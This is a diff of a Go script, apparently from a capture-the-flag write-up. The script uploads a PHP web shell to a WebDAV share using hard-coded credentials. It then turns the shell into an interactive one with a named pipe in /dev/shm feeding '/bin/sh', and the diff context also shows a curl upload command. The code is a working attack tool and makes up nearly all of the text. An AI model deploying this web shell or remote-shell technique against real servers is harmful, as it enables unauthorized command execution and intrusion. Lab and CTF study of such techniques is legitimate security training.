@@ -64,19 +64,53 @@ curl -T <file> <ip/webdav_test_inception> -u webdav_tester:babygurl69
 package main
 
 import (
+    "time"
+    "math/rand"
     "fmt"
     "net/http"
     "os"
     "io"
+    "bufio"
+    "strings"
+    "strconv"
 )
 
-
-func main(){
-     url := "http://10.129.239.140/webdav_test_inception"
+func fetch_command(file *os.File ,method string,cmd string ) string{
+    eurl := "http://10.129.240.19/webdav_test_inception"
     username :="webdav_tester"
     password := "babygurl69"
+    var fileBody io.Reader
+    if method != "GET" {
+        fileBody = file
+    }   
+    cmd = strings.ReplaceAll(cmd," ","+")
+    fmt.Println(cmd)
+    req,err := http.NewRequest(method,eurl+"/shell.php?cmd="+cmd,fileBody)
+    req.SetBasicAuth(username,password)
+    client := &http.Client{
+       Timeout: 1 * time.Second,
+    }
+    resp,err := client.Do(req)
     
+    if err != nil {
+        fmt.Printf("write req error: %w",err)
+    }
+    body, err := io.ReadAll(resp.Body)
+    if err != nil {
+        fmt.Printf("body error: %w",err)
+    }
+
+    defer resp.Body.Close()
+    return string(body)
+    
+
+}
+
+func main(){
     payload := "<?php system($_GET['cmd'])?>"
+    randId:= rand.Intn(1000)
+    input := "/dev/shm/inp."+strconv.Itoa(randId)
+    output:= "/dev/shm/out."+strconv.Itoa(randId)
     err := os.WriteFile("shell.php", []byte(payload), 0755)
     if err != nil {
         fmt.Printf("write error: %w",err)
@@ -86,50 +120,29 @@ func main(){
         fmt.Printf("write error: %w",err)
     }
     defer file.Close()
-    req,err := http.NewRequest("PUT",url+"/shell.php",file)
-
-    req.SetBasicAuth(username,password)
-    client := &http.Client{}
-    resp,err := client.Do(req)
     
-    if err != nil {
-        fmt.Printf("write error: %w",err)
-    }
-    body, err := io.ReadAll(resp.Body)
-    if err != nil {
-        fmt.Printf("write error: %w",err)
-    }
-
-    fmt.Println(string(body))
-    
-    defer resp.Body.Close()
+    resp := fetch_command(file,"PUT","")  
+    fetch_command(nil,"GET",fmt.Sprintf("mkfifo %s",input))
+    fetch_command(nil,"GET",fmt.Sprintf("tail -f %s | /bin/sh 2>&1 > %s",input,output))
+    fmt.Println(resp)
     for true{
-        var cmd string;
         fmt.Print("$shell> ")
-        fmt.Scanf("%s",&cmd)
-        shellUrl := url+"/shell.php?cmd="+cmd
-        req,err:= http.NewRequest("GET",shellUrl,nil)
-        if err != nil {
-            fmt.Println(err)
-        }
-        req.SetBasicAuth(username,password)
-        resp,err := client.Do(req)
-         if err != nil {
-             fmt.Println(err)
-        }
-        body,err := io.ReadAll(resp.Body)
-        if err != nil {
-            fmt.Println(err)
-        }
-        fmt.Println(string(body))
-        
-        defer resp.Body.Close()
+
+        reader := bufio.NewReader(os.Stdin)
+        cmd,_ := reader.ReadString('\n')
+        cmd = strings.Replace(cmd, "\n", "", -1)
+        cmd = fmt.Sprintf("echo \"%s\" > %s",cmd,input)
+        fmt.Println(cmd)
+        fetch_command(nil,"GET",cmd)
+        resp := fetch_command(nil,"GET",fmt.Sprintf("cat %s",output))
+        fmt.Println(resp)
         if cmd =="end"{
             fmt.Println("You will pay for this!!!")
             break
         }
     }
 }
+
 
 
 ```
